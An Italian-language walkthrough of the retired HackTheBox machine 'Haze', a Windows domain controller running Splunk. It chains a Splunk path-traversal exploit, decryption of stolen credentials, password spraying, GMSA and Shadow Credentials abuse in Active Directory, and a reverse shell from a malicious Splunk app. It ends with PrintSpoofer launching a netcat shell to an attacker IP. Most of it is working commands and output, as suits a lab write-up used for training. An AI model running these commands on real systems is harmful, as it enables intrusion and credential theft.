---
title: 'HTB Haze Walkthrough: Splunk RCE e AD Attack Chain'
slug: htb-haze-walkthrough
description: 'Writeup HTB Haze: CVE-2024-36991 su Splunk, decryption credenziali con splunksecrets, GMSA abuse, Shadow Credentials su AD e RCE fino a SYSTEM.'
image: /haze-writeup-walktrough-hackthebox.webp
draft: false
date: 2026-06-11T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - hackthebox
  - splunk
---

Haze è una macchina Hard Windows di HTB (Hack The Box) che ruota interamente attorno a Splunk Enterprise installato su un Domain Controller. L'attack path è una catena di escalation progressiva: si parte da un LFI non autenticato su Splunk, si decriptano credenziali cifrate, si abusa di ACL in Active Directory con GMSA e Shadow Credentials, si ottiene una shell tramite app Splunk malevola e si chiude con PrintSpoofer a SYSTEM.

Una macchina che copre tecniche reali di red team su ambienti enterprise — SIEM misconfiguration, DACL abuse, GMSA exploitation.

***

## Enumerazione — mynmap

Per lo scan uso **mynmap**, il mio wrapper custom di nmap disponibile su [github.com/hack-ita/mynmap](https://github.com/hack-ita/mynmap). A breve caricherò nel repo anche tutti gli altri tool custom che uso durante i lab.

```bash
sudo mynmap 10.129.232.50
```

Output rilevante (da `nmap.md`):

```
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          (Domain: haze.htb, DC01)
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8000/tcp  open  http          Splunkd httpd
8088/tcp  open  ssl/http      Splunkd httpd
8089/tcp  open  ssl/http      Splunkd httpd
clock-skew: mean: 7h53m13s
```

Il pattern è immediato: porte 88 (Kerberos), 389 (LDAP), 445 (SMB) → **Domain Controller**. Dominio `haze.htb`, hostname `DC01`.

Splunk Enterprise è attivo su tre porte: 8000 (Web UI), 8089 (REST API), 8088 (HTTP Event Collector). Dalla porta 8089 si ricava la versione:

```bash
curl -sk https://10.129.232.50:8089/ | grep version
# <generator build="78803f08aabb" version="9.2.1"/>
```

Da notare anche il **clock skew di \~8 ore** — il DC è avanti rispetto al nostro sistema. Questo è critico per Kerberos (che tollera massimo 5 minuti di skew). Si sincronizza prima di qualsiasi operazione Kerberos con il tool custom:

```bash
sudo mysynchronizehour 10.129.232.50
# [+] Sincronizzato con ntpdate: 10.129.232.50
```

```bash
echo "10.129.232.50 haze.htb dc01.haze.htb DC01.haze.htb" >> /etc/hosts
```

***

## Initial Access — CVE-2024-36991 LFI

### La vulnerabilità

Splunk Enterprise 9.2.1 su Windows è vulnerabile a **CVE-2024-36991** — path traversal sull'endpoint `/modules/messaging/` che permette lettura arbitraria di file di sistema **senza autenticazione** (CVSS 7.5).

La causa tecnica: la funzione Python `os.path.join` rimuove il drive letter da un token di path se il drive coincide con quello della directory corrente. Splunk processa il path URL segment per segment e questo comportamento diventa LFI completo.

Per una guida completa all'exploitation di Splunk: [Splunk Pentesting — RCE e Privilege Escalation sulla Porta 8089](https://hackita.it/articoli/splunk-pentesting/).

### File interessanti da leggere via LFI

Questi sono i path più utili da enumerare su un'istanza Splunk vulnerabile:

```
# Credenziali e cifratura
/etc/passwd                              → hash utenti Splunk locali (SHA-512)
/etc/auth/splunk.secret                  → chiave AES master per decifrare password
/etc/auth/server.pem                     → certificato SSL Splunk

# Configurazioni con credenziali
/etc/system/local/authentication.conf    → bind LDAP password cifrata ← JACKPOT
/etc/system/local/web.conf               → config web
/etc/system/local/inputs.conf            → connessioni DB e API key

# Log e sessioni
/var/log/splunk/splunkd.log
/var/log/splunk/audit.log
/var/run/splunk/session

# Configurazioni default
/etc/system/default/user-seed.conf       → credenziali iniziali setup
/etc/system/default/server.conf

# App installate (possibili configurazioni custom con creds)
/etc/apps/Splunk_TA_windows/bin
/etc/apps/SplunkForwarder/local
```

Il file più importante è **`authentication.conf`** in `local/` — contiene la password dell'account di bind LDAP cifrata con `splunk.secret`. Con entrambi i file si decripta tutto.

### Lettura file via curl

```bash
# Verifica vulnerabilità e dump hash utenti Splunk
curl -s "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd"
```

```
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9...::Administrator:admin:changeme@example.com
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAt...
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7x...
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI...
```

Hash SHA-512 — non craccabili con rockyou. Si va diretto ai file che contano.

```bash
# authentication.conf — credenziali LDAP cifrate
curl -s "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/system/local/authentication.conf"
```

```ini
[Haze LDAP Auth]
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
host = dc01.haze.htb
```

Il formato `$7$` indica cifratura AES256-GCM — non un hash, una stringa decifrabile con la chiave giusta.

```bash
# splunk.secret — chiave master
curl -s "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/auth/splunk.secret" -o splunk.secret
```

### Decryption con splunksecrets

```bash
pip3 install splunksecrets

splunksecrets splunk-decrypt -S splunk.secret \
  --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='
# Ld@p_Auth_Sp1unk@2k24
```

Il Distinguished Name del file è `CN=Paul Taylor` — il corrispondente `sAMAccountName` è `paul.taylor`:

```bash
nxc smb 10.129.232.50 -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24'
# [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
```

***

## Da paul.taylor a mark.adams — Password Spray

`paul.taylor` è in una OU ristretta senza WinRM. Il nome della password non sembra personalizzata — potrebbe essere riusata su altri account del dominio.

```bash
# Dump lista utenti via RID brute
nxc smb 10.129.232.50 -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' \
  --rid-brute 10000 | grep SidTypeUser | awk '{print $6}' | cut -d'\' -f2 > users.txt

# users.txt: Administrator, Guest, krbtgt, DC01$,
# paul.taylor, mark.adams, edward.martin, alexander.green, Haze-IT-Backup$

# Password spray
nxc smb 10.129.232.50 -u users.txt -p 'Ld@p_Auth_Sp1unk@2k24' \
  --continue-on-success | grep '\[+\]'
```

Hit: **`mark.adams:Ld@p_Auth_Sp1unk@2k24`**

`mark.adams` è membro di `Remote Management Users` → WinRM:

```bash
evil-winrm -i 10.129.232.50 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24'
```

**User flag:** `C:\Users\mark.adams\Desktop\user.txt`

***

## Da mark.adams a Haze-IT-Backup$ — GMSA Abuse

### BloodHound CE

```bash
bloodhound-ce-python -d haze.htb -dc dc01.haze.htb \
  -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' \
  -c ALL --zip -ns 10.129.232.50
```

`mark.adams` è membro del gruppo **`gMSA_Managers`**. BloodHound CE però **non mostra edges verso `Haze-IT-Backup$`** — il path non emerge automaticamente.

### Enumerazione manuale DACL — nxc daclread

Questo è il punto dove BloodHound non basta. Il modulo `-M daclread` di NetExec è fondamentale: permette di leggere direttamente le ACL di un oggetto AD filtrando per principal specifico, rivelando permessi che i tool grafici non visualizzano.

```bash
# Step 1 — Verifica permessi del gruppo gMSA_Managers sull'account GMSA
nxc ldap 10.129.232.50 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' \
  -M daclread -o TARGET='HAZE-IT-BACKUP$' ACTION=read PRINCIPAL=gMSA_Managers
```

Output critico:

```
ACE[5] info
    Access mask     : WriteProperty
    Object type     : ms-DS-GroupMSAMembership (888eedd6-ce04-df40-b462-b8a50e41ba38)
    Trustee         : gMSA_Managers
```

`gMSA_Managers` ha **WriteProperty** sull'attributo `msDS-GroupMSAMembership` di `Haze-IT-Backup$`. Questo attributo controlla chi può leggere la password GMSA — e possiamo modificarlo.

```bash
# Step 2 — Verifica attributo msDS-GroupMSAMembership (attualmente solo Domain Admins)
bloodyAD --host 10.129.232.50 -d haze.htb -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' \
  get object 'HAZE-IT-BACKUP$' --resolve-sd --attr msDS-GroupMSAMembership

# Step 3 — Verifica writable
bloodyAD --host 10.129.232.50 -d haze.htb -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' \
  get writable --detail --otype COMPUTER
# msDS-GroupMSAMembership: WRITE ← confermato
```

### Exploit — Aggiunta a PrincipalsAllowedToRetrieveManagedPassword

```powershell
# Step 4 — Da Evil-WinRM come mark.adams
Set-ADServiceAccount -Identity Haze-IT-Backup \
  -PrincipalsAllowedToRetrieveManagedPassword mark.adams

# Step 5 — Verifica
Get-ADServiceAccount -Identity Haze-IT-Backup -Properties * \
  | select PrincipalsAllowedToRetrieveManagedPassword
# {CN=Mark Adams,CN=Users,DC=haze,DC=htb}
```

```bash
# Step 6 — Leggi hash GMSA
nxc ldap 10.129.232.50 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa
# Account: Haze-IT-Backup$  NTLM: 4de830d1d58c14e241aff55f82ecdba1
```

***

## Da Haze-IT-Backup$ a edward.martin — DACL Chain + Shadow Credentials

### Secondo BloodHound con Haze-IT-Backup$

Il primo run con `mark.adams` mostrava AD incompleto. Con il nuovo account GMSA si ri-enumera:

```bash
bloodhound-ce-python -d haze.htb -dc dc01.haze.htb \
  -u 'HAZE-IT-BACKUP$' --hashes :4de830d1d58c14e241aff55f82ecdba1 \
  -c ALL --zip -ns 10.129.232.50
```

Ora il grafo mostra il path completo:

```
Haze-IT-Backup$ → WriteOwner → Support_Services
Support_Services → AddKeyCredentialLink → edward.martin
Support_Services → ForceChangePassword → edward.martin
```

`ForceChangePassword` è bloccato dalla minimum password age policy. Si usa **Shadow Credentials** via `AddKeyCredentialLink`.

### Step 1 — Cambia owner e acquisisci GenericAll

```bash
bloodyAD --host dc01.haze.htb -d haze.htb \
  -u 'haze-it-backup$' -p ':4de830d1d58c14e241aff55f82ecdba1' \
  set owner 'SUPPORT_SERVICES' 'HAZE-IT-BACKUP$'

bloodyAD --host dc01.haze.htb -d haze.htb \
  -u 'haze-it-backup$' -p ':4de830d1d58c14e241aff55f82ecdba1' \
  add genericAll 'SUPPORT_SERVICES' 'HAZE-IT-BACKUP$'

bloodyAD --host dc01.haze.htb -d haze.htb \
  -u 'haze-it-backup$' -p ':4de830d1d58c14e241aff55f82ecdba1' \
  add groupMember 'SUPPORT_SERVICES' 'HAZE-IT-BACKUP$'
```

Ora `Haze-IT-Backup$` è nel gruppo `Support_Services` che ha `AddKeyCredentialLink` su `edward.martin`.

### Step 2 — Shadow Credentials — AddKeyCredentialLink

Si aggiunge una chiave PKINIT (`msDS-KeyCredentialLink`) all'account target. Questo permette di autenticarsi via Kerberos con un certificato al posto della password, ottenendo il TGT e da lì l'NT hash.

**Requisiti:** `GenericWrite` o `GenericAll` sull'oggetto target + PKINIT supportato dal DC.

Prima si configura Kerberos con il tool custom:

```bash
mykrb5conf haze.htb DC01.haze.htb 10.129.232.50
```

**Metodo manuale — pywhisker:**

```bash
# 1. Aggiungi chiave con pywhisker
pywhisker -d "haze.htb" -u "Haze-IT-Backup$" \
  -p ':4de830d1d58c14e241aff55f82ecdba1' \
  --target "edward.martin" --action "add"
# output: FILE.pfx + password

# 2. Ottieni TGT con PKINIT
gettgtpkinit -cert-pfx FILE.pfx -pfx-pass 'PASS' \
  -dc-ip 10.129.232.50 'haze.htb/edward.martin' edward.martin.ccache
# salva AS-REP key nell'output

# 3. Recupera NT hash
export KRB5CCNAME=edward.martin.ccache
getnthash -key AS_REP_KEY haze.htb/'edward.martin'
# output: 09e0b3eeb2e7a6b0d419e9ff8f4d91af

# 4. Accesso
nxc winrm 10.129.232.50 -u edward.martin -H 09e0b3eeb2e7a6b0d419e9ff8f4d91af
evil-winrm -i 10.129.232.50 -u edward.martin -H 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

**Alternativa rapida — bloodyAD:**

```bash
bloodyAD --host dc01.haze.htb -d haze.htb \
  -u 'Haze-IT-Backup$' -p ':4de830d1d58c14e241aff55f82ecdba1' \
  add shadowCredentials edward.martin
# NT: 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

***

## Da edward.martin ad alexander.green — Splunk Backup → RCE

### Backup Splunk in C:\Backups

`edward.martin` è nel gruppo **`Backup_Reviewers`** → accesso a `C:\Backups`:

```powershell
ls C:\Backups\Splunk
# splunk_backup_2024-08-06.zip (~27MB)
```

Scarico il file su Kali e lo estraggo. Poi cerco subito tutti i `.conf` che contengono valori cifrati — il simbolo `$` è il delimitatore dei formati hash/cifratura Splunk:

```bash
find . -name "*.conf" | xargs grep -l '\$' 2>/dev/null
# ./var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf
# ./var/run/splunk/confsnapshot/baseline_local/system/local/server.conf
```

Due file. Il path `system/local` è quello che conta — contiene le configurazioni personalizzate dell'istanza, non i default. `server.conf` ha due hash `$7$` per `pass4SymmKey` e `sslPassword` — credenziali interne Splunk, non utili per il dominio. `authentication.conf` invece contiene l'account di bind LDAP — quello che interessa.

### Secondo authentication.conf — alexander.green

```ini
[Haze LDAP Auth]
bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb
bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
groupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb
host = dc01.haze.htb
```

Formato `$1$` — stesso meccanismo del `$7$` precedente, algoritmo diverso ma sempre decifrabile con `splunk.secret`. La chiave è anch'essa nel backup:

```bash
splunksecrets splunk-decrypt -S splunk.secret.bak \
  --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI='
# Sp1unkadmin@2k24
```

La password non funziona più per `alexander.green` su SMB/WinRM — è una vecchia password. Ma funziona come **admin su Splunk Web** sulla porta 8000.

### RCE via Splunk Malicious App

Con accesso admin alla Web UI si installa un'app malevola che esegue uno script automaticamente ogni 10 secondi. Tutti i dettagli sulla tecnica: [Splunk Pentesting — RCE via app deployment](https://hackita.it/articoli/splunk-pentesting/).

```bash
git clone https://github.com/0xjpuff/reverse_shell_splunk
cd reverse_shell_splunk

# Modifica run.ps1 con il tuo IP e porta
nano reverse_shell_splunk/bin/run.ps1

# Confeziona
tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk
```

Upload via interfaccia web all'URL:

```
http://10.129.232.50:8000/it-IT/manager/search/apps/local
```

**Apps → Manage Apps → Installa app da file** → upload del `.tgz`

```bash
nc -lvnp 4444
# connect from 10.129.232.50 — shell come HAZE\alexander.green
```

***

## Da alexander.green a SYSTEM — PrintSpoofer

### Verifica privilegi

```powershell
whoami /priv
# SeImpersonatePrivilege  Enabled
```

`alexander.green` è un service account Splunk — ha `SeImpersonatePrivilege`. Si usa **PrintSpoofer64** che sfrutta il Print Spooler per coercere un'autenticazione SYSTEM e impersonarla:

```powershell
.\PrintSpoofer64.exe -c "C:\Users\alexander.green\AppData\Local\Temp\nc64.exe 10.10.14.172 80 -e cmd"
# [+] Found privilege: SeImpersonatePrivilege
# [+] Named pipe listening...
# [+] CreateProcessWithTokenW() OK
```

```bash
# Su Kali — listener sulla porta 80
nc -lvnp 80
# nt authority\system
```

**Root flag:** `C:\Users\Administrator\Desktop\root.txt`

***

## Attack Path — Schema Completo

```
[Recon]
sudo mynmap 10.129.232.50
sudo mysynchronizehour 10.129.232.50  ← clock sync per Kerberos
        ↓
[CVE-2024-36991 LFI — nessuna auth]
/etc/system/local/authentication.conf → bindDNpassword $7$...
/etc/auth/splunk.secret               → chiave AES master
        ↓
[splunksecrets decrypt]
paul.taylor:Ld@p_Auth_Sp1unk@2k24
        ↓
[Password Spray]
mark.adams:Ld@p_Auth_Sp1unk@2k24 → WinRM → USER FLAG
        ↓
[BloodHound CE + DACL manuale con nxc daclread]
gMSA_Managers → WriteProperty msDS-GroupMSAMembership su Haze-IT-Backup$
Set-ADServiceAccount → nxc ldap --gmsa → NTLM: 4de830...
        ↓
[DACL Chain con Haze-IT-Backup$]
WriteOwner → GenericAll → groupMember → Support_Services
Support_Services → AddKeyCredentialLink → edward.martin
        ↓
[Shadow Credentials — mykrb5conf + pywhisker/bloodyAD]
NT hash edward.martin: 09e0b3... → WinRM
        ↓
[Splunk Backup — C:\Backups]
find *.conf → authentication.conf: alexander.green / $1$ hash
splunk.secret → Sp1unkadmin@2k24 (admin Splunk Web)
        ↓
[Splunk RCE]
Upload malicious app → shell come alexander.green
        ↓
[SeImpersonatePrivilege]
PrintSpoofer64 → SYSTEM → ROOT FLAG
```

***

## MITRE ATT\&CK

| Tecnica                             | ID        | Fase                 |
| ----------------------------------- | --------- | -------------------- |
| Exploit Public-Facing Application   | T1190     | Initial Access       |
| Unsecured Credentials in Files      | T1552.001 | Credential Access    |
| Valid Accounts — Domain Accounts    | T1078.002 | Privilege Escalation |
| Password Spraying                   | T1110.003 | Credential Access    |
| Account Manipulation — GMSA         | T1098.007 | Privilege Escalation |
| Shadow Credentials                  | T1556     | Credential Access    |
| Deploy Application                  | T1072     | Execution            |
| PowerShell                          | T1059.001 | Execution            |
| Token Impersonation (SeImpersonate) | T1134.001 | Privilege Escalation |

***

## Lessons Learned

**Splunk su un DC è una combinazione pericolosa.** Le credenziali di bind LDAP sono cifrate con una chiave sul filesystem — un LFI non autenticato si trasforma direttamente in credential theft sul dominio.

**BloodHound non vede tutto.** Il path via `WriteProperty` su `msDS-GroupMSAMembership` non emergeva nel grafo. Serve analisi manuale con `nxc ldap -M daclread` — strumento fondamentale per leggere ACL su oggetti AD specifici, filtrando per principal. In ambienti reali questa differenza tra "quello che BloodHound mostra" e "quello che esiste davvero" può fare la differenza tra roottare o no.

**I backup di produzione contengono credenziali di produzione.** Il backup Splunk aveva `splunk.secret` e `authentication.conf` con le credenziali dell'admin. Archiviare backup non cifrati su host accessibili anche a utenti con privilegi limitati è un rischio critico.

**Il clock skew è bloccante per Kerberos.** 8 ore di differenza rendono inutilizzabili TGT e operazioni basate su PKINIT. `mysynchronizehour` risolve questo prima di qualsiasi operazione sul dominio.

***

*Writeup su macchina ritirata da HackTheBox. Per approfondire le tecniche Splunk usate in questo walkthrough: [Splunk Pentesting — RCE e Privilege Escalation sulla Porta 8089](https://hackita.it/articoli/splunk-pentesting/).*
